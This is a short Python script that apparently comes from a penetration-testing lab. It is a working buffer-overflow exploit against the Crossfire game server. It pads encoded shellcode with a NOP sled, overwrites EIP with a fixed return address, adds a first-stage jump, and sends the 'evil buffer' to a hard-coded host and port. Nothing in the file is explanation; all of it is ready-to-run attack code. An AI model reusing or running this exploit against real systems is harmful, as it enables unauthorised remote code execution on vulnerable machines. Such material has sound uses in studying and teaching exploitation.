#!/usr/bin/python
import socket
import time

print "[*] Buffer Overflow Attack - for crossfire game"
time.sleep(1)
print "[*] Setup the server address and port number"
time.sleep(1)
host = "192.168.128.44"
port = 13327

print "[*] Creating the buffer payload"
time.sleep(1)

shellcode =  b""
shellcode += b"\xda\xd0\xb8\x97\xf9\x3d\xf6\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x12\x31\x46\x17\x83\xc6\x04"
shellcode += b"\x03\xd1\xea\xdf\x03\xec\xd7\xd7\x0f\x5d\xab"
shellcode += b"\x44\xba\x63\xa2\x8a\x8a\x05\x79\xcc\x78\x90"
shellcode += b"\x31\xf2\xb3\xa2\x7b\x74\xb5\xca\xbb\x2e\x32"
shellcode += b"\x8a\x54\x2d\xbd\x88\x3e\xb8\x5c\x3c\x58\xeb"
shellcode += b"\xcf\x6f\x16\x08\x79\x6e\x95\x8f\x2b\x18\x48"
shellcode += b"\xbf\xb8\xb0\xfc\x90\x11\x22\x94\x67\x8e\xf0"
shellcode += b"\x35\xf1\xb0\x44\xb2\xcc\xb3"


padding = (4368 - int(len(shellcode))) * '\x90' 
eip = "\x96\x45\x13\x08"
#offset = "C" * 7
first_stage = "\x83\xC0\x0C\xFF\xE0\x90\x90"
mybuffer = "\x11(setup sound " + padding + shellcode + eip + first_stage + "\x90\x00#"
print "[*] mybuffer size: " + str(len(mybuffer))
session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."

session.connect((host,port))
print session.recv(1024)

session.send(mybuffer)
session.close()

print "[*] Pyload sent!"
